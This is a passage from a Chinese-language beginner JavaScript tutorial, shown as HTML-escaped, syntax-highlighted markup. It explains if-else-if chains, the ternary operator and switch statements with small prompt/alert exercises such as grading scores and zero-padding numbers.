        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你输入的年份是闰年&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你输入的年份是平年&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例3判断是否中奖&#34;&gt;案例3：判断是否中奖&lt;/h4&gt;
&lt;p&gt;接收用户输入的姓名，来判断是否中将，如果输入的是刘德华，则提示中了5快起那，否则提示没有中建&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gift&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入你的姓名&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;gift&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;刘德华&amp;#39;&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;恭喜，你中了5块钱&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;很遗憾，你没有中奖&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;634-if-else-if-语句多分支语句&#34;&gt;6.3.4 if else if 语句（多分支语句）&lt;/h3&gt;
&lt;h4 id=&#34;6341-语法结构&#34;&gt;6.3.4.1 语法结构&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 适合于检查多重条件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式1&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;语句1&lt;/span&gt;;
} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式2&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;语句2&lt;/span&gt;;
} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式3&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;语句3&lt;/span&gt;;
} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 上述条件都不成立执行此处代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;6342-执行流程&#34;&gt;6.3.4.2 执行流程&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200509152949.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 多分支语句，就是利用多个条件来选择不同的语句执行，得到不同的结果，多选1的过程
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. if else if 语句是多分支语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 语法规范
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式1&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 语句1;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式2&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 语句2;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;条件表达式3&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 语句3;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 最后的语句; 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 执行思路
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 如果条件表达式1，满足就执行，语句1执行完毕后，退出整个if分支语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 如果条件表达式1，部门组，则判断条件表达式2，满足的话，执行语句2，以此类推
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 注意点
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5.1 多分支语句还是多选1，最后只能有一个语句执行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5.2 else if 里哦面的条件理论上是可以任意多个的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5.3 else if 中间有个空格
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例判断成绩级别&#34;&gt;案例：判断成绩级别&lt;/h4&gt;
&lt;p&gt;要求：接收用户输入的分数，根据分数输出对应的等级字母A、B、C、D、E&lt;/p&gt;
&lt;p&gt;其中：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;90分（含）以上，输出：A&lt;/li&gt;
&lt;li&gt;80分（含）~90分（不含），输出：B&lt;/li&gt;
&lt;li&gt;70分（含）~80分（不含），输出：C&lt;/li&gt;
&lt;li&gt;60分（含）~70分（不含），输出：D&lt;/li&gt;
&lt;li&gt;60分（不含）以下，输出：E&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;按照从大到小判断的思路&lt;/li&gt;
&lt;li&gt;弹出prompt输入框，让用户输入分数，把这个值取过来保存到变量中&lt;/li&gt;
&lt;li&gt;使用多分支if else if语句来分别判断输出不同的值&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 伪代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 按照从大到小判断的思路
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 弹出prompt输入框，让用户输入分数（score），把这个值取过来保存到变量中
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 使用多分支if else if语句来分别判断输出不同的值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;score&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入分数&amp;#39;&lt;/span&gt;);
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;score&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;宝贝，你是我的骄傲 A&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;score&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;宝贝，你已经很出色了 B&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;score&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;你要继续加油喽 C&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;score&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;孩子，你很危险 D&amp;#39;&lt;/span&gt;);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;熊孩子，我不想和你说话，我只想用鞭子和你说话 E&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;64-三元表达式&#34;&gt;6.4 三元表达式&lt;/h2&gt;
&lt;p&gt;三元表达式也能做一些简单的条件选择。由三元运算符组成的式子成为三元表达式。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 有三元运算符组成的式子我们称之为三元表达式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. ++num 3 + 5 ? :
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 语法结构
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//    条件表达式 ? 表达式1 : 表达式2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 执行思路
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//    如果条件表达式结果为真，则返回表达式1的值，如果条件表达式结果为假，则返回表达式2的值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 5. 代码体验
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;是的&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;不是的&amp;#39;&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 我们知道表达式是有返回值的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 等价于下面这个代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;是的&amp;#39;&lt;/span&gt;;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;不是的&amp;#39;&lt;/span&gt;;
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;案例：数字补0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用户输入数字，如果数字小于10，则在前面补0，比如01，09，如果数字大于10，则不需要补，比如20。&lt;/p&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户输入0~59之间的一个数字&lt;/li&gt;
&lt;li&gt;如果数字小于10，则在这个数字前面补0（加0）否则不做操作&lt;/li&gt;
&lt;li&gt;用一个变量接受这个返回值，输出&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 用户输入0~59之间的一个数字
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 如果数字小于10，则在这个数字前面补0（加0）否则不做操作
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 用一个变量接受这个返回值，输出
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入一个 0~59 之间的一个数字&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 三元表达式 表达式 ? 表达式1 : 表达式2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;;		&lt;span style=&#34;color:#75715e&#34;&gt;// 把返回值赋值给一个变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;65-分支流程控制-switch-语句&#34;&gt;6.5 分支流程控制 switch 语句&lt;/h2&gt;
&lt;h3 id=&#34;651-语法结构&#34;&gt;6.5.1 语法结构&lt;/h3&gt;
&lt;p&gt;switch 语句也是多分支语句，它用于基于不同的条件来执行不同的代码。当要针对变量设置一系列的特定值的选项时，就可以使用 switch。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;表达式&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;// 表达式 等于 value1 时要执行的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;// 表达式 等于 value2 时要执行的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;// 表达式 不等于任何一个 value 时要执行的代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. switch 语句也是多分支语句，也可以实现多选1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 语法结构 switch 转换、开关；case 小例子或者选项的意思
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;表达式&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;执行语句1&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;执行语句2&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        ...
        &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        	&lt;span style=&#34;color:#a6e22e&#34;&gt;执行最后的语句&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 执行思路，利用我们的表达式的值 和 case 后面的选项值相匹配，如果匹配上，就执行该 case 里面的语句，如果都没有匹配上，那么执行 default 里面的语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 代码验证
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;cosnole&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这是1&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这是2&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这是3&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;没有匹配的结果&amp;#39;&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// switch 注意事项
